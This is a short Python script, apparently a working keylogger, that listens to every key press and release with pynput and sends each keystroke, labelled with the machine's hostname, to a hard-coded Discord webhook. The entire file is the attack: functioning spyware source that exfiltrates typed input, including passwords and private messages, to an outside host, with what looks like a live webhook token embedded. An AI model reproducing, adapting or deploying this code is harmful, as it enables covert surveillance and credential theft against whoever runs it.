from pynput import keyboard
from discord_webhook import DiscordWebhook
import socket
import os

computer_name = socket.gethostname()

webhook_url = "https://discordapp.com/api/webhooks/1143883741975040040/bQFWBjhqDPbyUEP9ou-sRfQaBzfmu3x3PVPV15_MLGuPm4FX0kroWmF5VMWqDO_CbTJJ"

def webhook(content):
    DiscordWebhook(url=webhook_url, content=content).execute()

def on_key_press(key):
    try:
        webhook(f'Computer {computer_name} pressed: {key.char}')
    except AttributeError:
        webhook(f'Computer {computer_name} pressed a special key: {key}')

def on_key_release(key):
    webhook(f'Computer {computer_name} released: {key}')

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
